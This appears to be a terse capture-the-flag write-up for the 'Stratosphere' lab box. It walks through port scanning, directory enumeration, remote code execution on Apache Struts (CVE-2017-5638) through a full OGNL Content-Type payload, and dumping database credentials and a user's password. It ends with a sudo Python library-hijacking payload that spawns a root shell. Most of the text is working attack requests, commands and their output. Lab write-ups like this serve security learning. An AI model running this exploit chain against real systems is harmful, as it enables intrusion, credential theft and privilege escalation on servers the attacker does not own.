###  keyword

Struts-pwm, tomcat, mysql,  python lib inject

### information

Nmap 7.70 scan initiated Mon Mar 11 11:14:03 2019 as: nmap -sC -sV -oA nmap  64

Host is up (0.47s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey:
|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA)
|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA)
|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (ED25519)
80/tcp   open  http
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Mon, 11 Mar 2019 03:13:44 GMT
|     Connection: close

###   enum the website

gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u  host  -x html,txt,jsp

[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : html,txt,js

/index.html (Status: 200)
2019/03/11 11:35:22 [!] Get http://10.10.10.64/1125.txt: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/manager (Status: 302)
/GettingStarted.html (Status: 200)
/Monitoring (Status: 302)

###  look in the site 

![web](file:///home/parrot/image/startosphere.png)



is running tomcat. Heading to /Monitoring/ redirects me to /Monitoring/example/Welcome.action` which has a register and sign in functionality both of which were inactive. The extension `.action` is used sometimes instead of `.do` for apache struts action. Which reminded me of [CVE 2017-5638](https://www.cvedetails.com/cve/cve-2017-5638) which allows RCE through OGNL

### exploit

as you know that, here is the exploit about [struts-pwn](https://github.com/mazen160/struts-pwn) the An exploit for Apache Struts CVE-2017-5638

see the below request :

GET /Monitoring/example/Welcome.action HTTP/1.1
Host: 10.10.10.64
User-Agent: struts-pwn (https://github.com/mazen160/struts-pwn)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='which nc').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

###  tomcat config 

 python3 struts-pwn.py  -u http://10.10.10.64/Monitoring/example/Welcome.action --cmd="ls -la"

drwxr-xr-x  5 root    root    4096 Mar 10 18:42 .
drwxr-xr-x 42 root    root    4096 Oct  3  2017 ..
lrwxrwxrwx  1 root    root      12 Sep  3  2017 conf -> /etc/tomcat8
-rw-r--r--  1 root    root      68 Oct  2  2017 db_connect
drwxr-xr-x  2 tomcat8 tomcat8 4096 Sep  3  2017 lib
lrwxrwxrwx  1 root    root      17 Sep  3  2017 logs -> ../../log/tomcat8
drwxr-xr-x  2 root    root    4096 Mar 10 18:42 policy
drwxrwxr-x  4 tomcat8 tomcat8 4096 Feb 10  2018 webapps
lrwxrwxrwx  1 root    root      19 Sep  3  2017 work -> ../../cache/tomcat8

[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin

###  EXECute to db 

 python3 struts-pwn.py  -u http://10.10.10.64/Monitoring/example/Welcome.action --cmd 'mysql --us
er=admin --password=admin  -e "select * from users.accounts"'

fullName        password        username
Richard F. Smith        9tc*rhKuG5TyXvUJOrE^5CK7k       richard



###   knock into the system

richard@stratosphere:~$ sudo -l
Matching Defaults entries for richard on stratosphere:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py

came across this excellent post by rastating: https://rastating.github.io/privilege-escalation-via-python-library-hijacking/.

### payload 

 echo 'import os; os.system("/bin/bash")' > hashlib.py

